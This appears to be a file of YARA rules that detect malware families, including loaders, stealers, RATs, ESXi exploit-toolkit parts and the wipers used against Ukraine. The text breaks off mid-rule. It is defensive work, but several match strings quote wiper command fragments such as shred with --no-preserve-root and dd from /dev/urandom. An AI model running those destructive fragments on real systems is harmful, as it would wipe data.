rule RUSSIANPANDA_Win_Mal_Koi_Loader : FILE
{
	meta:
		description = "Detects Koi Loader"
		author = "RussianPanda"
		id = "a608558d-97c8-5161-a6eb-29fd420458a8"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Koi/win_mal_Koi_loader.yar#L1-L14"
		license_url = "N/A"
		hash = "47e208687c2fb40bdbaa17e368aaa1bd"
		logic_hash = "4f909865c6d274804c3fa7f66822d7bea71bb93e7c6a422ebaf220df056ac095"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {27 11 68 05}
		$s2 = {15 B1 B3 09}
		$s3 = {B5 96 AA 0D}
		$s4 = {74 [0-10] C1 E9 18}

	condition:
		uint16( 0 ) == 0x5A4D and all of ( $s* )
}

rule RUSSIANPANDA_Workersdevbackdoor : FILE
{
	meta:
		description = "Detects WorkersDevBackdoor"
		author = "RussianPanda"
		id = "725e0924-c108-5927-8d27-e4bc5b284883"
		date = "2023-12-15"
		modified = "2024-01-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/WorkersDevBackdoor/WorkDevBackdoor.yar#L3-L20"
		license_url = "N/A"
		logic_hash = "f92ad9dc657d87a47e539ea2ee896f9b86bb95e51a890a838c6e6b0efa5deb7d"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {72 00 65 00 67 00 69 00 73 00 74 00 65 00 72 00 20 00 7B 00 30 00 7D 00 20 00 7B 00 31 00 7D}
		$s2 = {72 FB 00 00 70 72 13 01 00 70 28 20 00 00 0A 72 2D 01 00 70}
		$s3 = {55 00 53 00 45 00 52 00 44 00 4F 00 4D 00 41 00 49 00 4E}
		$s4 = {43 00 4F 00 4D 00 50 00 55 00 54 00 45 00 52 00 4E 00 41 00 4D 00 45}

	condition:
		3 of ( $s* ) and pe.imports ( "mscoree.dll" ) and filesize < 2MB
}
rule RUSSIANPANDA_Workersdevbackdoor_PS : FILE
{
	meta:
		description = "Detects WorkersDevBackdoor PowerShell script"
		author = "RussianPanda"
		id = "d2b526c1-a9f5-57de-818c-99b02e778a0d"
		date = "2023-12-15"
		modified = "2023-12-15"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/WorkersDevBackdoor/WorkersDevBackdoor_PS.yar#L1-L18"
		license_url = "N/A"
		logic_hash = "c71eed8fd7a44f3018150cc6ef55d10779093ed8e4c77fd9babcf9b1b9fadfda"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "sleep" wide
		$s2 = "convertto-securestring" wide
		$s3 = "System.Drawing.dll" wide
		$s4 = "System.Web.Extensions.dll" wide
		$s5 = "System.Windows.Forms.dll" wide
		$s6 = "CSharp" wide

	condition:
		all of ( $s* ) and filesize < 200KB
}
rule RUSSIANPANDA_Solarmarker_Loader_PS2EXE : FILE
{
	meta:
		description = "Detects SolarMarker loader using PS2EXE"
		author = "RussianPanda"
		id = "837883a1-b657-52ae-95c4-ebafc8ac55de"
		date = "2024-01-04"
		modified = "2024-01-04"
		reference = "https://www.esentire.com/blog/solarmarker-to-jupyter-and-back"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SolarMarker/solarmarker_loader.yar#L1-L17"
		license_url = "N/A"
		hash = "b45c31679c2516b38c7ff8c395f1d11d"
		logic_hash = "4f579f350c3320e7b811cae0efe7302e852f59adc02d805f64ba464f8a995f25"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {72 7B 02 00 70 72 89 02 00 70 72 91 02 00 70 [22] 72 97 02 00 70 72 AB 02 00 70 72 B5 02 00 70}
		$s2 = {13 0D 72 [3] 70}
		$s3 = {72 C1 02 00 70 72 B2 03 00 70 72 B8 03 00 70}

	condition:
		all of ( $s* ) and filesize > 200MB
}
rule RUSSIANPANDA_Solarmarker_First_Stage_Payload : FILE
{
	meta:
		description = "Detects SolarMarker First Stage payload"
		author = "RussianPanda"
		id = "56eec644-9ad7-51db-9d11-68ea3e12c36a"
		date = "2024-01-30"
		modified = "2024-01-30"
		reference = "https://x.com/luke92881/status/1751968350689771966?s=20"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SolarMarker/solarmarker_first_stage_payload.yar#L1-L21"
		license_url = "N/A"
		hash = "f53563541293a826738d3b8f1164ea43"
		logic_hash = "e704614782b0f3cba60c53413e889113d2d44f37e60801205e5ed5ff921b13ee"
		score = 75
		quality = 71
		tags = "FILE"

	strings:
		$s1 = {63 72 65 64 75 69}
		$s2 = {43 72 65 64 55 49 50 72 6F 6D 70 74 46 6F 72 43 72 65 64 65 6E 74 69 61 6C 73}
		$s3 = {50 6F 77 65 72 53 68 65 6C 6C}
		$s4 = {73 65 74 5F 43 75 72 73 6F 72 50 6F 73 69 74 69 6F 6E}
		$s5 = {73 65 74 5F 41 63 63 65 70 74 42 75 74 74 6F 6E}
		$s6 = {4D 65 73 73 61 67 65 42 6F 78 42 75 74 74 6F 6E 73}
		$s7 = {41 67 69 6C 65 44 6F 74 4E 65 74 52 54}
		$s8 = "_CorExeMain"

	condition:
		all of them and filesize > 250MB
}

rule RUSSIANPANDA_Solarmarker_Loader : FILE
{
	meta:
		description = "Detects SolarMarker loader 1-4-2024"
		author = "RussianPanda"
		id = "b385fcd4-62b7-5a83-8a2e-6841fdd17526"
		date = "2024-01-04"
		modified = "2024-01-04"
		reference = "https://www.esentire.com/blog/solarmarker-to-jupyter-and-back"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SolarMarker/solarmarker_backdoor.yar#L3-L19"
		license_url = "N/A"
		hash = "8eeefe0df0b057fc866b8d35625156de"
		logic_hash = "035eccb41f2ecdeb196003542c165cedad96e3e8e741511b4beda3dfe1ece74e"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {06 [0-7] 58 D1 8C [3] 01 28 [3] 0A 0A}

	condition:
		all of ( $s* ) and #s1 > 5 and filesize < 7MB and pe.imports ( "mscoree.dll" )
}
rule RUSSIANPANDA_Solardropper
{
	meta:
		description = "SolarMarker first stage detection"
		author = "RussianPanda"
		id = "8e40b001-ae00-5768-bb91-e45264748087"
		date = "2023-06-22"
		modified = "2024-01-03"
		reference = "https://www.esentire.com/blog/solarmarker-to-jupyter-and-back"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SolarMarker/solardropper.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "5dccb7be94e814335c0c867f8b3dd8855043375fe9f1235d5519c690fc7df842"
		score = 75
		quality = 85
		tags = ""

	strings:
		$p1 = {2d 00 71 00 71 00 78 00 74 00 72 00 61 00 63 00 74 00 3a 00 22 00 3c 00 66 00 69 00 6c 00 71 00 71 00 6e 00 61 00 6d 00 71 00 71 00 3e 00 22 00}
		$p2 = "deimos.exe"
		$p3 = {5e 00 2d 00 28 00 5b 00 5e 00 3a 00 20 00 5d 00 2b 00 29 00 5b 00 20 00 3a 00 5d 00 3f 00 28 00 5b 00 5e 00 3a 00 5d 00 2a 00 29 00 24 00}

	condition:
		all of ( $p* )
}
rule RUSSIANPANDA_Solarphantom : FILE
{
	meta:
		description = "SolarPhantom Backdoor Detection"
		author = "RussianPanda"
		id = "f564a943-e83b-5c1b-ba8c-b227d69d3fd8"
		date = "2023-06-22"
		modified = "2023-12-11"
		reference = "https://www.esentire.com/blog/solarmarker-to-jupyter-and-back"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/SolarMarker/solarphantom.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "3b49d301e625d5abf1b726481a80d6a97d33acd3301c12964f2f37d37130c1b7"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$p1 = {B8 94 E3 46 00 E8 C6 EB FA FF 8B 45 F8}
		$p2 = {68 E8 EF 46 00 FF 75 E4}
		$p3 = {62 72 76 70 72 66 5f 62 6b 70}

	condition:
		uint16( 0 ) == 0x5A4D and 1 of ( $p* ) and filesize < 600KB
}

rule RUSSIANPANDA_Purecrypter_Core : FILE
{
	meta:
		description = "Detects PureCrypter Core payload"
		author = "RussianPanda"
		id = "41aaa187-0fb5-53fe-a162-8d1a4974ccc1"
		date = "2024-01-09"
		modified = "2024-01-09"
		reference = "https://www.zscaler.com/blogs/security-research/technical-analysis-purecrypter"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/PureCrypter/purecrypter_core.yar#L3-L28"
		license_url = "N/A"
		hash = "e4faa7d7a098414449abffb210fd874798207ee9d27643c8088676ff429b56b7"
		logic_hash = "8c761a98369436ffbe1379152461753778985a42ae656567018b47c71af7d866"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$s1 = {47 5A 69 70 53 74 72 65 61 6D}
		$s2 = {41 73 73 65 6D 62 6C 79 4C 6F 61 64 65 72 00 43 6F 73 74 75 72 61}
		$s3 = {44 65 66 6C 61 74 65 53 74 72 65 61 6D}
		$cnct = {72 ?? ?? 00 70 28 FB 00 00 0A 72 ?? ?? 00 70 28 ?? 00 00 0A}
		$nr1 = {7B 00 31 00 31 00 31 00 31 00 31 00 2D 00 32 00 32 00 32 00 32 00 32 00 2D 00 34 00 30 00 30 00 30 00 31 00 2D 00 30 00 30 00 30 00 30 00 31 00 7D}
		$nr2 = {7B 00 31 00 31 00 31 00 31 00 31 00 2D 00 32 00 32 00 32 00 32 00 32 00 2D 00 34 00 30 00 30 00 30 00 31 00 2D 00 30 00 30 00 30 00 30 00 32 00 7D}
		$nr3 = {7B 00 31 00 31 00 31 00 31 00 31 00 2D 00 32 00 32 00 32 00 32 00 32 00 2D 00 32 00 30 00 30 00 30 00 31 00 2D 00 30 00 30 00 30 00 30 00 32 00 7D}
		$nr4 = {7B 00 31 00 31 00 31 00 31 00 31 00 2D 00 32 00 32 00 32 00 32 00 32 00 2D 00 32 00 30 00 30 00 30 00 31 00 2D 00 30 00 30 00 30 00 30 00 31 00 7D}

	condition:
		filesize < 5MB and all of ( $s* ) and dotnet.number_of_resources > 4 and dotnet.number_of_resources < 6 and 2 of ( $nr* ) and dotnet.assembly_refs [ 1 ] . name contains "protobuf-net" and #cnct > 5
}

rule RUSSIANPANDA_Purecrypter : FILE
{
	meta:
		description = "Detects PureCrypter"
		author = "RussianPanda"
		id = "5670772c-ada1-55fa-b7fd-9dadd1756259"
		date = "2024-01-09"
		modified = "2024-01-09"
		reference = "https://www.zscaler.com/blogs/security-research/technical-analysis-purecrypter"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/PureCrypter/purecrypter.yar#L3-L22"
		license_url = "N/A"
		hash = "566d8749e166436792dfcbb5e5514f18c9afc0e1314833ac2e3d86f37ff2030f"
		logic_hash = "dd8592fa0b7d240d23235008601500a20e068032f6dcd6e90a38b06ac747b8af"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {28 ?? 00 00 ?? 28 02 00 00 2B 28 ?? 00 00 (0A|06)}
		$s2 = {73 ?? 00 00 0A}
		$s3 = {73 ?? 00 00 06 6F ?? 00 00 06}
		$s4 = {52 65 73 6F 75 72 63 65 4D 61 6E 61 67 65 72}
		$s5 = {28 ?? 00 00 ?? 6F ?? 00 00 0A 28 03 00 00 2B ?? 6F ?? 00 00 0A 28 ?? 00 00 2B}

	condition:
		filesize < 6MB and 4 of ( $s* ) and dotnet.number_of_resources > 0 and dotnet.number_of_resources < 2 and dotnet.resources [ 0 ] . length > 300KB
}

rule RUSSIANPANDA_Metastealer
{
	meta:
		description = "Detects the old version of MetaStealer 11-2023"
		author = "RussianPanda"
		id = "c178630b-d188-5faf-86b3-436894241d77"
		date = "2023-11-16"
		modified = "2023-12-30"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/MetaStealer/metastealer.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "f78b376713daf82aa2e0cbd6bf45f33d25530449fa05673c8a7c6b4c0dddca79"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "FileScannerRule"
		$s2 = "MSObject"
		$s3 = "MSValue"
		$s4 = "GetBrowsers"
		$s5 = "Biohazard"

	condition:
		4 of ( $s* ) and pe.imports ( "mscoree.dll" )
}

rule RUSSIANPANDA_Metastealer_Core_Payload
{
	meta:
		description = "Detects MetaStealer Core Payload"
		author = "RussianPanda"
		id = "ff5854b5-4dac-59d7-8c5a-d5b808d63483"
		date = "2023-12-29"
		modified = "2023-12-29"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/MetaStealer/metastealer_core_payload_12-2023.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "99a319023f2c1b714a70458bd33649d6cc343b500a409af12c2eb1ce38ba4241"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "FileScannerRule"
		$s2 = "TreeObject"
		$s3 = "Schema"
		$s4 = "StringDecrypt"
		$s5 = "AccountDetails"

	condition:
		4 of ( $s* ) and pe.imports ( "mscoree.dll" )
}
rule RUSSIANPANDA_Metastealer_NET_Reactor_Packer : FILE
{
	meta:
		description = "Detects NET_Reactor_packer 12-2023 used in MetaStealer"
		author = "RussianPanda"
		id = "5d4f62d2-6a27-53af-9b03-61daa99c10a4"
		date = "2023-12-29"
		modified = "2023-12-30"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/MetaStealer/metastealer_12-2023_packer.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "1951d8b05f11b8a77a5bf792ad2b0ad95b8dede936ab5cd0699383468c3c97a8"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {C7 84 24 80 02 00 00 24 02 00 00 C6 44 24}
		$s2 = "mscoree.dll" wide
		$s3 = {43 61 76 69 6c 73 20 43 6f 72 70 2e 20 32 30 31 30}
		$s4 = {80 F1 E7 80 F2 44 [16] 80 F1 4B 80 F2 23}

	condition:
		3 of ( $s* ) and filesize < 600KB
}
rule RUSSIANPANDA_MAESTRO : FILE
{
	meta:
		description = "Detects MAESTRO payload"
		author = "RussianPanda"
		id = "c7684ab1-c7ac-504e-9402-ef0bd0b664b9"
		date = "2025-12-31"
		modified = "2025-12-31"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ESXiExploitToolkit/win_mal_MAESTRO.yar#L1-L14"
		license_url = "N/A"
		hash = "37972a232ac6d8c402ac4531430967c1fd458b74a52d6d1990688d88956791a7"
		logic_hash = "943a4508bae1a285efb05232de29463c3ca667c28fd97e0ec9fd2e88df76b6c0"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "devcon.exe disable \"PCI\\VEN_15AD&DEV_0740\""
		$s2 = "devcon.exe disable \"ROOT\\VMWVMCIHOSTDEV\""
		$s3 = "Open SymbolicLink Failed" wide
		$s4 = "Done!!!" ascii wide

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Mydriversys : FILE
{
	meta:
		description = "Detects the malicious driver - MyDriver.sys"
		author = "RussianPanda"
		id = "9b97acfd-21e8-5974-9f95-ecf7c561fada"
		date = "2025-12-31"
		modified = "2025-12-31"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ESXiExploitToolkit/win_mal_MyDriverSYS.yar#L1-L13"
		license_url = "N/A"
		hash = "c3f8da7599468c11782c2332497b9e5013d98a1030034243dfed0cf072469c89"
		logic_hash = "9eb5273dcd895aa861839119a7850461c52bb7f423301f7e0e03d8c382fa3ec9"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "SetGuestInfo  7 11111111"
		$s2 = "found ESXi%d.%d build-%d"
		$s3 = "current build is not surpported"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Getshellplugin : FILE
{
	meta:
		description = "Detects GetShell Plugin (client)"
		author = "RussianPanda"
		id = "f20f1c80-a52a-5f3a-8bbd-915ef77e9850"
		date = "2025-12-31"
		modified = "2025-12-31"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ESXiExploitToolkit/win_mal_GetShellPlugin.yar#L1-L13"
		license_url = "N/A"
		hash = "4614346fc1ff74f057d189db45aa7dc25d6e7f3d9b68c287a409a53c86dca25e"
		logic_hash = "758339dc10eab3ae0fd743568ba356e91d2902ad6c8228095322903bdc00af6e"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "InfDefaultInstall.exe .\\vsock.inf"
		$s2 = "InfDefaultInstall.exe .\\vmci.inf"
		$s3 = "invalid SERVER_CID:PORT"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Vsockpuppet : FILE
{
	meta:
		description = "Detects VSOCKpuppet payload"
		author = "RussianPanda"
		id = "82ace9c6-5ca2-5665-8ed5-8fecfe54f12c"
		date = "2025-12-31"
		modified = "2025-12-31"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/ESXiExploitToolkit/linux_mal_VSOCKpuppet.yar#L1-L14"
		license_url = "N/A"
		hash = "c3f8da7599468c11782c2332497b9e5013d98a1030034243dfed0cf072469c89"
		logic_hash = "5c83b3303b092372da8ecd7cb8457a37e3f53042cdf8463fc8837208d34f09b6"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "received command:%s"
		$s2 = "MCISock_GetAFValue failed"
		$s3 = "recv_response failed"
		$s4 = "send_msg_len failed"

	condition:
		uint32( 0 ) == 0x464C457F and all of them
}
rule RUSSIANPANDA_Golang_Base64_Enc : FILE
{
	meta:
		description = "Detects Base64 Encoding and Decoding patterns in Golang binaries"
		author = "RussianPanda"
		id = "6330e005-9c67-5acd-9063-aa7e30e92f5f"
		date = "2024-01-10"
		modified = "2024-01-14"
		reference = "https://unprotect.it/technique/base64/"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/Techniques/golang_base64_enc.yar#L1-L18"
		license_url = "N/A"
		hash = "509a359b4d0cd993497671b91255c3775628b078cde31a32158c1bc3b2ce461c"
		logic_hash = "72cf3ee948df9c4ce593f16a49397e79fdc5ecc3264b3685bbc54f60ed1278bd"
		score = 75
		quality = 83
		tags = "FILE"

	strings:
		$s1 = {62 61 73 65 36 34 2e 53 74 64 45 6e 63 6f 64 69 6e 67 2e 45 6e 63 6f 64 65 54 6f 53 74 72 69 6e 67 28 [0-15] 29}
		$s2 = {62 61 73 65 36 34 2e 53 74 64 45 6e 63 6f 64 69 6e 67 2e 44 65 63 6f 64 65 53 74 72 69 6e 67 28 [0-15] 29}
		$s3 = {69 66 20 65 72 72 20 21 3D 20 6E 69 6C 20 7B}
		$s4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

	condition:
		all of ( $s* ) and uint16( 0 ) == 0x5A4D
}
rule RUSSIANPANDA_Win_Mal_Stealc_V2 : FILE
{
	meta:
		description = "Detects StealC v2"
		author = "RussianPanda"
		id = "052f4556-ddba-5187-8dcb-138f02bc4c36"
		date = "2025-04-10"
		modified = "2025-04-10"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/StealC/win_mal_StealC_v2.yar#L1-L12"
		license_url = "N/A"
		hash = "bc7e489815352f360b6f0c0064e1d305db9150976c4861b19b614be0a5115f97"
		logic_hash = "1715ef4e1914a50d8f4a0644ddfd7f9bb2b6f0ec0dfc77615dce4dd5fc943166"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {48 8d ?? ?? ?? ??  00 48 8d}
		$s2 = {0F B7 C8 81 E9 19 04 00 00 74 14 83 E9 09 74 0F 83 E9 01 74 0A 83 E9 1C 74 05 83 F9 04 75 08}

	condition:
		uint16( 0 ) == 0x5A4D and #s1 > 500 and all of them and filesize < 900KB
}
rule RUSSIANPANDA_Win_Mal_Astarionrat : FILE
{
	meta:
		description = "Detects AstarionRAT"
		author = "RussianPanda"
		id = "70588745-761a-5b74-a612-7affde300b09"
		date = "2025-02-14"
		modified = "2026-02-14"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/AstarionRAT/win_mal_AstarionRAT.yar#L1-L13"
		license_url = "N/A"
		hash = "a508d0bb583dc6e5f97b6094f8f910b5b6f2b9d5528c04e4dee62c343fce6f4b"
		logic_hash = "ea8050f9127fdbc70b3e8f390bb557b9ac39045e98a1998f11363016d17c3164"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "s5://%s:%s@%s:%d"
		$s2 = "Failed to connect to the server"
		$s3 = "Impersonated"

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule RUSSIANPANDA_Darkvnc : FILE
{
	meta:
		description = "Detects DarkVNC"
		author = "RussianPanda"
		id = "dbc86ac8-5ea3-59a7-b3ab-68c603165720"
		date = "2024-01-15"
		modified = "2024-01-15"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/b59e13d90d02e058560f94cf00913d42751dbc45/DarkVNC/darkvnc.yar#L1-L15"
		license_url = "N/A"
		hash = "3c74dccd06605bcf527ffc27b3122959"
		logic_hash = "1dd1246e0b22181706433f0cff9b231017e747d8faaa2db4cb9adefeab492ab7"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = {66 89 84 24 ?? 00 00 00 B8 ?? 00 00 00}
		$s2 = {66 31 14 41 48}
		$s3 = "VncStopServer"
		$s4 = "VncStartServer"

	condition:
		uint16( 0 ) == 0x5A4D and 3 of them and filesize < 700KB
}
/*
 * YARA Rule Set
 * Repository Name: CadoSecurity
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 7
 * Skipped: 0 (age), 1 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule CADOSECURITY_Wiper_Ukr_Feb_2022 : FILE
{
	meta:
		description = "Detects Wiper seen in Ukraine 23rd Feb 2022"
		author = "cadosecurity.com"
		id = "98f80c1b-7575-51d4-8265-680ea204990a"
		date = "2022-02-23"
		modified = "2023-04-10"
		reference = "https://github.com/cado-security/wiper_feb_2022"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Wiper_Ukr_Feb_2022.yar#L1-L18"
		license_url = "N/A"
		hash = "1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591"
		logic_hash = "fa96b88c42bdd4ba437f090d781b38c5c7f9fcb690aeff4161f24aedb1870587"
		score = 75
		quality = 80
		tags = "FILE"
		license = "Apache License 2.0"

	strings:
		$ = "Hermetica Digital Ltd" wide ascii
		$ = "DRV_XP_X64" wide ascii
		$ = "Windows\\System32\\winevt\\Logs" wide ascii
		$ = "EPMNTDRV\\%u" wide ascii

	condition:
		uint16( 0 ) == 0x5A4D and all of them
}
rule CADOSECURITY_Linux_Worm_ORCSHRED
{
	meta:
		description = "Detects ORCSHRED worm used in attacks on Ukrainian ICS"
		author = "mmuir@cadosecurity.com"
		id = "4fdad42e-81eb-58a4-b869-a0aae9c72357"
		date = "2022-04-12"
		modified = "2022-07-06"
		reference = "https://github.com/cado-security/DFIR_Resources_Industroyer2"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Linux_Worm_ORCSHRED.yar#L1-L19"
		license_url = "N/A"
		hash = "43d07f28b7b699f43abd4f695596c15a90d772bfbd6029c8ee7bc5859c2b0861"
		logic_hash = "bf826e2cb0bc0fef74db1248539b00dfa57a9a9c84c0ab374e6b3f92b02de84e"
		score = 75
		quality = 80
		tags = ""
		license = "Apache License 2.0"

	strings:
		$a = "is_owner" ascii
		$b = "Start most security mode!" ascii
		$c = "check_solaris" ascii
		$d = "wsol.sh" ascii
		$e = "wobf.sh" ascii
		$f = "disown" ascii
		$g = "/var/log/tasks" ascii

	condition:
		4 of them
}
rule CADOSECURITY_Powershell_Downloader_POWERGAP
{
	meta:
		description = "Detects POWERGAP downloader used against Ukrainian ICS"
		author = "mmuir@cadosecurity.com"
		id = "d2a2604c-c558-5663-8dd3-44f3fdda1f71"
		date = "2022-04-12"
		modified = "2022-07-06"
		reference = "https://github.com/cado-security/DFIR_Resources_Industroyer2"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Powershell_Downloader_POWERGAP.yar#L1-L19"
		license_url = "N/A"
		logic_hash = "a9ef1d04ca921f285e973f6abcb2b355eae110678da866e3b6499aa0318338fd"
		score = 75
		quality = 80
		tags = ""
		license = "Apache License 2.0"

	strings:
		$a = "Start-work" ascii
		$b = "$GpoGuid" ascii
		$c = "$SourceFile" ascii
		$d = "$DestinationFile" ascii
		$e = "$appName" ascii
		$f = "LDAP://ROOTDSE" ascii
		$g = "GPT.INI" ascii
		$h = "Get-WmiObject" ascii

	condition:
		5 of them
}
rule CADOSECURITY_Linux_Wiper_SOLOSHRED
{
	meta:
		description = "Detects SOLOSHRED wiper used against Ukrainian ICS"
		author = "mmuir@cadosecurity.com"
		id = "1772a047-6b67-5d6c-9f82-0be0b49967ac"
		date = "2022-04-12"
		modified = "2022-07-06"
		reference = "https://github.com/cado-security/DFIR_Resources_Industroyer2"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Linux_Wiper_SOLOSHRED.yar#L1-L17"
		license_url = "N/A"
		hash = "87ca2b130a8ec91d0c9c0366b419a0fce3cb6a935523d900918e634564b88028"
		logic_hash = "bc3e574406c635922c278723f6eebd97562123b42b372d2b023fd6f433581e8d"
		score = 75
		quality = 80
		tags = ""
		license = "Apache License 2.0"

	strings:
		$a = "printenv | grep -i \"ora\"" ascii
		$b = "shred" ascii
		$c = "--no-preserve-root" ascii
		$d = "/dev/dsk" ascii
		$e = "$(ls /)" ascii

	condition:
		all of them
}
rule CADOSECURITY_Linux_Wiper_AWFULSHRED
{
	meta:
		description = "Detects AWFULSHRED wiper used against Ukrainian ICS"
		author = "mmuir@cadosecurity.com"
		id = "0328f0d9-3c73-5d13-bf32-8a25139cf3cf"
		date = "2022-04-12"
		modified = "2022-07-06"
		reference = "https://github.com/cado-security/DFIR_Resources_Industroyer2"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Linux_Wiper_AWFULSHRED.yar#L1-L26"
		license_url = "N/A"
		hash = "bcdf0bd8142a4828c61e775686c9892d89893ed0f5093bdc70bde3e48d04ab99"
		logic_hash = "796dfdc4238e3d729180657b7bc79464003434c73568b49895cb8d37ce1a5499"
		score = 75
		quality = 80
		tags = ""
		license = "Apache License 2.0"

	strings:
		$isBash = "/bin/bash" ascii
		$a1 = "declare -r" ascii
		$a2 = "bash_history" ascii
		$a3 = "bs=1k if=/dev/urandom of=" ascii
		$a4 = "systemd" ascii
		$a5 = "apache http ssh" ascii
		$a6 = "shred" ascii
		$var1 = "iwljzfkg" ascii
		$var2 = "yrkdrrue" ascii
		$var3 = "agzerlyf" ascii
		$var4 = "rggygzny" ascii
		$var5 = "zubzgnvp" ascii

	condition:
		$isBash and 3 of ( $a* ) and 4 of ( $var* )
}
rule CADOSECURITY_Whispergate_Stage_1 : FILE
{
	meta:
		description = "Detects first stage payload from WhisperGate"
		author = "mmuir@cadosecurity.com"
		id = "603aa1f9-749f-5cce-b49f-0005b7949e2c"
		date = "2022-01-17"
		modified = "2023-04-10"
		reference = "https://github.com/cado-security/DFIR_Resources_Whispergate"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cado Security/Whispergate_Stage_1.yar#L1-L16"
		license_url = "N/A"
		hash = "a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92"
		logic_hash = "b8d8f2f56fe3a6f42699b7736386f9e8083fc728d06750f51064be1ff2f6620b"
		score = 75
		quality = 72
		tags = "FILE"
		license = "Apache License 2.0"

	strings:
